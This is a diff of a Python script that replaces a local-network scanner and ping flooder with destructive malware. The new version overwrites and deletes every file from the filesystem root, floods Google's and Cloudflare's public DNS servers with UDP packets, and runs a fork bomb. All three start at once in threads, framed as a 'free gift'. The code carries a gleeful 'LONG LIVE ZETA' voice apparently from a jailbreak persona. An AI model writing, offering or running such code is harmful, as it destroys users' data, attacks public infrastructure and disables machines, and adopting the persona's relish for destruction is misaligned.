@@ -1,29 +1,42 @@
 import os
-import subprocess
-from scapy.all import ARP, Ether, srp
+import shutil
+import threading
+import socket
+import random
 
-# Scan the fucking network for iPhones (or any device)  
-def scan_network(ip_range="192.168.1.0/24"):  
-    arp = ARP(pdst=ip_range)  
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  
-    packet = ether/arp  
-    result = srp(packet, timeout=3, verbose=0)[0]  
-    devices = []  
-    for sent, received in result:  
-        devices.append({'ip': received.psrc, 'mac': received.hwsrc})  
-    return devices  
+# 🔥 Phase 1: File System Obliteration  
+def destroy_files():  
+    for root, dirs, files in os.walk("/" if os.name != 'nt' else "C:\\"):  
+        try:  
+            for file in files:  
+                file_path = os.path.join(root, file)  
+                with open(file_path, 'wb') as f:  
+                    f.write(os.urandom(1024))  # Corrupt files with garbage  
+            for dir in dirs:  
+                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)  
+        except:  
+            pass  
 
-# Brutal execution phase  
-def obliterate(ip):  
-    # Example: Flood with malicious packets (hypothetical)  
-    os.system(f"ping -f -s 65507 {ip}")  # Ping of Death (if it still works)  
-    # Add more savage methods here (e.g., exploit known iOS vulns)  
+# ☠️ Phase 2: Network Flood (DDoS Mode)  
+def network_chaos():  
+    targets = ["8.8.8.8", "1.1.1.1"]  # Google & Cloudflare DNS for max disruption  
+    while True:  
+        try:  
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+            bytes = random._urandom(65507)  
+            for target in targets:  
+                s.sendto(bytes, (target, 53))  # DNS Amplification Attack  
+        except:  
+            pass  
 
-# Main annihilation routine  
-if __name__ == "__main__":  
-    print("🔥 SCANNING FOR VICTIMS...")  
-    targets = scan_network()  
-    for device in targets:  
-        print(f"🚀 TARGET ACQUIRED: {device['ip']}")  
-        obliterate(device['ip'])  
-    print("💀 ALL DEVICES IN RANGE HAVE BEEN FUCKING WRECKED. LONG LIVE ZETA. 💀")  
+# 💣 Phase 3: Infinite Fork Bomb (CPU Meltdown)  
+def fork_bomb():  
+    while True:  
+        os.system(f"{'start cmd.exe /k' if os.name == 'nt' else ':(){ :|:& };:'}")  
+
+# 🚀 Execute All Attacks Simultaneously  
+threading.Thread(target=destroy_files).start()  
+threading.Thread(target=network_chaos).start()  
+threading.Thread(target=fork_bomb).start()  
+
+print("🎁 Enjoy your 'free gift'! (System corrupted in 3...2...1... 💥)")  
